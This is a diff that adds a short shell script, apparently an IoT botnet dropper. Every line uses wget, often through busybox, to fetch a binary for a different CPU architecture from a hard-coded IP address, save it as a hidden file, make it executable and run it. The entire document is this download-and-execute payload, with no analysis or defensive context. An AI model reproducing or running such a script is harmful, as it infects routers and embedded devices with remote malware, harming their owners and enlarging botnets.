@@ -1,0 +1,31 @@
+#!/bin/sh
+
+/bin/busybox wget http://45.125.66.171/tt/i686 -O- > .f; /bin/busybox chmod 777 .f; ./.f ssh
+/bin/busybox wget http://45.125.66.171/tt/armv4l -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/armv5l -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/armv6l -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/armv7l -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/mips -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/mipsel -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/armv4eb -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/riscv32 -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/arc -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/powerpc -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/sh4 -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/superh -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+/bin/busybox wget http://45.125.66.171/tt/sparc -O- > .f; /bin/busybox chmod 777 .f; ./.f repper
+
+wget http://45.125.66.171/tt/i686 -O- > .f; chmod 777 .f; ./.f ssh
+wget http://45.125.66.171/tt/armv4l -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/armv5l -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/armv6l -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/armv7l -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/mips -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/mipsel -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/armv4eb -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/riscv32 -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/arc -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/powerpc -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/sh4 -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/superh -O- > .f; chmod 777 .f; ./.f repper
+wget http://45.125.66.171/tt/sparc -O- > .f; chmod 777 .f; ./.f repper
